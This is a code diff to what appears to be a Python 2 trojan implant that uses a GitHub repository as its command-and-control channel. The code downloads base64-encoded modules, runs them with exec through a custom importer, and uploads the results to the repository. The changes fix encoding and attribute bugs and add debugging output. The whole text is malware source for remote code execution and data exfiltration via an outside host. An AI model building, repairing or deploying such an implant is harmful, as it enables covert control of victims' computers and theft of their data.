@@ -33,7 +33,6 @@ def get_file_contents(filepath):
     
 
     for filename in tree.tree:
-        print "[###] %s" %filename.path    
         
         if filepath in filename.path:
             print "[#] Found file %s" % filepath
@@ -60,8 +59,8 @@ def store_module_result(data):
     gh,repo,branch=connect_to_server()
     remote_path = "data/%s/%d.data" % (pigeon_id,random.randint(100,1000))
     try:
-        repo.create_file(remote_path,"new data",base64.b64ncode(data))
-    except e:
+        repo.create_file(remote_path,"new data adding",base64.b64encode(data))
+    except:
 		print "[*] Exception while storing data.."
     
     return
@@ -76,7 +75,7 @@ class GitImporter(object):
             new_library = get_file_contents("modules/%s" % fullname)
 
             if new_library is not None:
-                set.current_module_code = base64.b64decode(new_library)
+                self.current_module_code = base64.b64decode(new_library)
               
                 return self
       
@@ -87,13 +86,16 @@ class GitImporter(object):
             module = imp.new_module(name)
             exec self.current_module_code in module.__dict__
             sys.modules[name] = module
-        except e:
-			print "[#] Exception while loading module %s" % e
+        except :
+			print "[#] Exception while loading module %s"
      
         return module
 
 def module_runner(module):
+	
     task_queue.put(1)
+    print "[))] %s" % (sys.modules[module])
+    return
     result = sys.modules[module].run()
     task_queue.get()
  
@@ -108,6 +110,8 @@ while True:
         config = get_pigeon_config()
 
         for task in config:
+			
+			
             t = threading.Thread(target=module_runner,args=(task['module'],))
             t.start()
             time.sleep(random.randint(1,10))
